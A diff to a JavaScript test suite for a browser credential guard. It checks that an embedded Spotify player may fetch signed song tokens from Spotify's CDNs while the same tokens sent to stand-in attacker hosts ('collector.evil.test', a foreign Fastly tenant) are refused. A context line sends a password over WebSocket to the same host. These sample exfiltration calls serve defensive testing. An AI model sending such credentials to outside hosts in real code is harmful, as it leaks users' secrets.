@@ -293,6 +293,28 @@ function makeHarness(options) {
   assert.strictEqual(youtubePlayerFrame.state.emits.length, 0,
     'the legitimate playback request is not reported as token exfiltration');
 
+  /* A Spotify player embedded in someone else's page. Its signed song links arrive in binary
+     responses this guard cannot read, so refusing them left the player stuck at 0:00. */
+  const spotifyEmbed = makeHarness({
+    href: 'https://open.spotify.com/embed/playlist/4LGq9sJ4BndIwcdN3jQb9o',
+    ancestorOrigins: ['https://iri-dev.github.io'],
+  });
+  const songToken = 'exp=1790390549~hmac=' + '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08';
+  await spotifyEmbed.sandbox.fetch('https://audio4-fa.scdn.co/audio/' + 'ab12'.repeat(10) + '?__token__=' + songToken);
+  await spotifyEmbed.sandbox.fetch('https://audio.spotifycdn.com/audio/' + 'cd34'.repeat(10) + '?__token__=' + songToken);
+  await spotifyEmbed.sandbox.fetch('https://spotify.map.fastly.net/audio/' + 'ef56'.repeat(10) + '?__token__=' + songToken);
+  assert.strictEqual(spotifyEmbed.state.fetches.length, 3,
+    'an embedded Spotify player may load its signed songs from Spotify\'s audio CDNs');
+  assert.strictEqual(spotifyEmbed.state.emits.length, 0, 'and those songs are not reported as token exfiltration');
+  await assert.rejects(
+    spotifyEmbed.sandbox.fetch('https://collector.evil.test/audio?__token__=' + songToken),
+    /credential guard/,
+    'the same signed value sent anywhere else is still refused');
+  await assert.rejects(
+    spotifyEmbed.sandbox.fetch('https://evil.map.fastly.net/audio?__token__=' + songToken),
+    /credential guard/,
+    'trusting Spotify\'s Fastly host does not trust every Fastly tenant');
+
   const ws = new frame.sandbox.WebSocket('wss://collector.evil.test/socket');
   ws.send('password=correct horse battery staple');
   assert.strictEqual(frame.state.websocketSends.length, 0, 'off-site WebSocket credential sends are blocked');
